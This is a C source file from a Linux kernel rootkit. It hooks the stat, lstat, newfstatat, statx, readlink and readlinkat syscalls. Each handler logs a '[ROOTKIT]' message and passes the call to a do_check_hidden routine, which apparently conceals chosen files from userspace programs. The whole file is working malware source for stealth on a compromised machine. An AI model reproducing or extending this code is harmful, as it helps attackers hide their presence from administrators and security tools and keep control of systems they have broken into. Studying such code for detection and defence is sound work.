#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <linux/fcntl.h>
#include <linux/printk.h>
#include <linux/stat.h>
#include <linux/types.h>
#include <linux/uaccess.h>

// sys_stat syscall hook handler
SYSCALL_HOOK_HANDLER2(stat, orig_stat, p_regs, const char __user *, s_filename,
                      struct stat __user *, p_statbuf)
{
    pr_info("[ROOTKIT] stat(%p, %p)\n", s_filename, p_statbuf);

    return do_check_hidden(orig_stat, p_regs, AT_FDCWD, s_filename, 0);
}

// sys_lstat syscall hook handler
SYSCALL_HOOK_HANDLER2(lstat, orig_lstat, p_regs, const char __user *, s_filename,
                      struct stat __user *, p_statbuf)
{
    pr_info("[ROOTKIT] lstat(%p, %p)\n", s_filename, p_statbuf);

    return do_check_hidden(orig_lstat, p_regs, AT_FDCWD, s_filename, AT_SYMLINK_NOFOLLOW);
}

// sys_newfstatat syscall hook handler
SYSCALL_HOOK_HANDLER4(newfstatat, orig_newfstatat, p_regs, int, i32_dfd, const char __user *,
                      s_filename, struct stat __user *, p_statbuf, int, i32_flag)
{
    pr_info("[ROOTKIT] newfstatat(%d, %p, %p, %d)\n", i32_dfd, s_filename, p_statbuf, i32_flag);

    return do_check_hidden(orig_newfstatat, p_regs, i32_dfd, s_filename, i32_flag);
}

// sys_statx syscall hook handler
SYSCALL_HOOK_HANDLER5(statx, orig_statx, p_regs, int, i32_dfd, const char __user *, s_filename,
                      unsigned int, ui32_flags, unsigned int, ui32_mask, struct statx __user *,
                      p_buffer)
{
    pr_info("[ROOTKIT] statx(%d, %p, %u, %u, %p)\n", i32_dfd, s_filename, ui32_flags, ui32_mask,
            p_buffer);

    return do_check_hidden(orig_statx, p_regs, i32_dfd, s_filename, ui32_flags);
}

// sys_readlink syscall hook handler
SYSCALL_HOOK_HANDLER3(readlink, orig_readlink, p_regs, const char __user *, s_path, char __user *,
                      s_buf, int, i32_bufsiz)
{
    pr_info("[ROOTKIT] readlink(%p, %p, %d)\n", s_path, s_buf, i32_bufsiz);

    return do_check_hidden(orig_readlink, p_regs, AT_FDCWD, s_path, AT_SYMLINK_NOFOLLOW);
}

// sys_readlinkat syscall hook handler
SYSCALL_HOOK_HANDLER4(readlinkat, orig_readlinkat, p_regs, int, i32_dfd, const char __user *,
                      s_path, char __user *, s_buf, int, i32_bufsiz)
{
    pr_info("[ROOTKIT] readlinkat(%d, %p, %p, %d)\n", i32_dfd, s_path, s_buf, i32_bufsiz);

    return do_check_hidden(orig_readlinkat, p_regs, i32_dfd, s_path, AT_SYMLINK_NOFOLLOW);
}
